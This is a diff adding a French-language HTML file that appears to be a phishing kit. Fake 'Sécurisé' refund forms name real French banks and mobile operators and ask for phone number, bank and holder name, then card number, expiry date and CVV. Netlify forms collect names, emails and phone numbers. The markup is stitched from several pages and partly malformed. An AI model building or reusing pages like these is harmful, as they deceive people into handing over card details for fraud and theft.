@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Service Remboursement</title>
+<style>
+body{
+    font-family: Arial, sans-serif;
+    background:#f3f5f4;
+    margin:0;
+}
+.container{
+    max-width:400px;
+    margin:50px auto;
+    background:#fff;
+    padding:25px;
+    border-radius:15px;
+    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+}
+h1{
+    color:#1f5f46;
+    text-align:center;
+}
+label{
+    font-weight:bold;
+    display:block;
+    margin-top:15px;
+}
+input, select{
+    width:100%;
+    padding:12px;
+    margin-top:5px;
+    border-radius:10px;
+    border:1px solid #ccc;
+}
+button{
+    width:100%;
+    padding:14px;
+    margin-top:20px;
+    border:none;
+    border-radius:10px;
+    background:#1f5f46;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+button:hover{
+    background:#184c39;
+}
+.secure{
+    text-align:right;
+    color:green;
+    font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+  <div class="container">
+<div class="secure">🔒 Sécurisé</div>
+<h1>Formulaire de Remboursement</h1>
+
+<form>
+<label>Numéro de téléphone *</label>
+<input type="tel" placeholder="06......" required>
+
+<label>Opérateur</label>
+<select>
+<option>Choisir</option>
+<option>Orange</option>
+<option>SFR</option>
+<option>FREE MOBILE</option>
+<option>BOUYGUES</option>
+</select>
+
+<label>Banque</label>
+<select>
+<option>Choisir</option>
+<option>Société générale </option>
+<option>LCL</option>
+<option>BNP Paribas</
+option>
+<option>Crédit agricole </
+</select>
+
+<label>Nom du titulaire *</label>
+<input type="text" required>
+
+<button type="submit">Valider</button>
+</form>
+
+</div>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Formulaire</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #f3f4f6;
+  padding: 20px;
+}
+
+/* الكرت الأبيض */
+.card {
+  max-width: 420px;
+  margin: auto;
+  background: white;
+  padding: 25px;
+  border-radius: 30px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+}
+
+/* العناوين */
+label {
+  display: block;
+  font-weight: 700;
+  margin-top: 18px;
+  color: #2d3748;
+}
+
+/* الحقول */
+input {
+  width: 100%;
+  padding: 16px;
+  margin-top: 8px;
+  border-radius: 18px;
+  border: 2px solid #e5e7eb;
+  background: #f9fafb;
+  font-size: 16px;
+  outline: none;
+  transition: 0.3s;
+}
+
+input:focus {
+  border-color: #1c8f5f;
+  background: white;
+}
+
+/* صف MM/AA و CVV */
+.row {
+  display: flex;
+  gap: 15px;
+}
+
+.row div {
+  flex: 1;
+}
+
+/* الزر الأخضر مود احترافي */
+button {
+  width: 100%;
+  margin-top: 30px;
+  padding: 18px;
+  border: none;
+  border-radius: 22px;
+
+  background: linear-gradient(180deg, #1c8f5f, #158a55);
+  color: white;
+
+  font-size: 18px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  cursor: pointer;
+
+  box-shadow: 0 12px 25px rgba(21,138,85,0.35);
+  transition: 0.3s;
+}
+
+button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 16px 30px rgba(21,138,85,0.45);
+}
+
+button:active {
+  transform: translateY(1px);
+  box-shadow: 0 8px 15px rgba(21,138,85,0.25);
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <label>NOM DU TITULAIRE *</label>
+  <input type="text">
+
+  <label>NUMÉRO DE CARTE *</label>
+  <input type="text" placeholder="•••• •••• •••• ••••">
+
+  <div class="row">
+    <div>
+      <label>MM/AA *</label>
+      <input type="text" placeholder="MM/AA">
+    </div>
+
+    <div>
+      <label>CVV *</label>
+      <input type="text" placeholder="123">
+    </div>
+  </div>
+
+  <button>VALIDER MON REMBOURSEMENT</button>
+
+</div>
+
+</body>
+</html>
+<form name="contact" method="POST" data-netlify="true">
+  <input type="hidden" name="form-name" value="contact">
+  
+  <input type="text" name="fullname" placeholder="Full Name" required>
+  <input type="email" name="email" placeholder="Email" required>
+  <input type="text" name="phone" placeholder="Phone">
+  
+  <button type="submit">Envoyer</button>
+</form>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Demande de remboursement</title>
+</head>
+<body>
+
+<h2>Demande de remboursement</h2>
+
+<form name="contact" method="POST" data-netlify="true">
+  <input type="hidden" name="form-name" value="contact">
+
+  <input type="text" name="fullname" placeholder="Nom complet" required><br><br>
+
+  <input type="email" name="email" placeholder="Votre email" required><br><br>
+
+  <textarea name="message" placeholder="Votre message" required></textarea><br><br>
+
+  <button type="submit">Envoyer</button>
+</form>
+
+</body>
+</html>
